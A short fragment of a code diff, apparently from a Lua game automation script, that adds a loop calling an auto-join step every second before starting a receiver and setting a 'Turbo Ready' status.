+    while true do
+        AutoJoinStep()
+        t_wait(1)
+    end
+end)
+
 t_spawn(startReceiver)
 setStatus("Turbo Ready")
